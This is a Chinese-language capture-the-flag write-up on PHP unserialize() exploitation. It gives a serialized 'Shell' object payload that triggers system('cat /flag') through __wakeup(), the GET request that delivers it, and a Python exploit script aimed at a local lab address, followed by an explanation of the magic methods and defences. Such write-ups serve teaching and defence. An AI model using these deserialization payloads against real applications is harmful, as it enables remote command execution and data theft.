# PHP 反序列化

## 题目信息

- **题目名称**：反序列化的代价
- **难度**：★★★☆☆
- **考点**：PHP 反序列化（Deserialization）、魔术方法

## 题目描述

后端用 PHP 的 `unserialize()` 处理了你传入的数据。这个函数有点危险。flag 在 `/flag` 里。

## 解法步骤

### 第一步：分析功能

页面接受序列化字符串，使用 `unserialize()` 将其恢复为 PHP 对象。代码中定义了两个类：

- **User**：有一个 `__wakeup()` 魔术方法，输出用户名
- **Shell**：有一个 `__wakeup()` 魔术方法，执行 `system($this->cmd)`

### 第二步：构造 Payload

利用 `Shell` 类的 `__wakeup()` 方法，在反序列化时自动执行命令：

```php
O:5:"Shell":1:{s:3:"cmd";s:9:"cat /flag";}
```

解释：
- `O:5:"Shell"`：一个名为 `Shell` 的对象（5 个字符）
- `1`：1 个属性
- `s:3:"cmd"`：属性名为 `cmd`（3 个字符）
- `s:9:"cat /flag"`：属性值为 `cat /flag`（9 个字符）

### 第三步：发送 Payload

```http
GET /?data=O:5:"Shell":1:{s:3:"cmd";s:9:"cat /flag";}
```

### 第四步：获取 Flag

**自动化 Exploit：**

```python
#!/usr/bin/env python3
import requests
from urllib.parse import quote

BASE = 'http://127.0.0.1:13391'
payload = 'O:5:"Shell":1:{s:3:"cmd";s:9:"cat /flag";}'

r = requests.get(f'{BASE}/?data={quote(payload)}')
import re
flag = re.search(r'flag\{[^}]+\}', r.text).group()
print(f'[+] {flag}')
```

## 漏洞原理

### PHP 反序列化

PHP 的 `unserialize()` 函数将序列化字符串还原为 PHP 对象。在这个过程中，会触发对象的"魔术方法"：

| 魔术方法 | 触发时机 |
|----------|---------|
| `__wakeup()` | 反序列化时 |
| `__destruct()` | 对象销毁时 |
| `__toString()` | 对象被当作字符串时 |
| `__call()` | 调用不可访问的方法时 |

### 利用方式

攻击者通过构造恶意的序列化数据，利用代码中已有的类（Gadgets）的魔术方法，实现任意代码执行、文件读取等操作。

### 防御方法

- 不要对用户输入使用 `unserialize()`
- 使用 JSON 序列化（`json_encode`/`json_decode`）替代
- 如果必须使用，对用户输入进行严格校验
